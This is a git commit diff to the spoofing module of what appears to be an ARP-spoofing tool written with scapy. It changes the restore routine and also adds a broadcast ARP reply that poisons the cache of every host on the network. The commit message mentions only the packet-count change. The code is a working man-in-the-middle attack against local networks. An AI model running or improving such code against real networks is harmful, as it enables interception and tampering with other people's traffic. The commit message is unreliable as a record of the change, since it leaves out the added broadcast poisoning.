0d349ca5d8e15c5ff79d275d2877c309e7cebf84
isitAlo <alneami327@gmail.com>
2026-05-05 20:46:56 +0300

    Enhance packet count in restore function
    Increased the count of packets sent during the restore process from 5 to 10 for better reliability.

--- core/spoof.py
+++ core/spoof.py
@@ -7,16 +7,18 @@ def get_device_info(ip):
     return (ans[0][1].hwsrc, "Known") if ans else (None, None)
 
 def spoof(target_ip, gateway_ip, target_mac, gateway_mac):
-    # Tell target we are the router
+    # Packet to target: "I am the Router"
     t_pkt = scapy.Ether(dst=target_mac)/scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
-    # Tell router we are the target
+    # Packet to gateway: "I am the target"
     g_pkt = scapy.Ether(dst=gateway_mac)/scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
-    scapy.sendp(t_pkt, verbose=False)
-    scapy.sendp(g_pkt, verbose=False)
+    # Broadcast Packet: Reinforce the lie to the entire network cache
+    b_pkt = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(op=2, pdst=target_ip, psrc=gateway_ip)
+    
+    scapy.sendp([t_pkt, g_pkt, b_pkt], verbose=False)
 
 def restore(dest_ip, src_ip):
     d_mac, _ = get_device_info(dest_ip)
     s_mac, _ = get_device_info(src_ip)
     if d_mac and s_mac:
         pkt = scapy.Ether(dst=d_mac)/scapy.ARP(op=2, pdst=dest_ip, hwdst=d_mac, psrc=src_ip, hwsrc=s_mac)
-        scapy.sendp(pkt, count=5, verbose=False)
+        scapy.sendp(pkt, count=10, verbose=False)
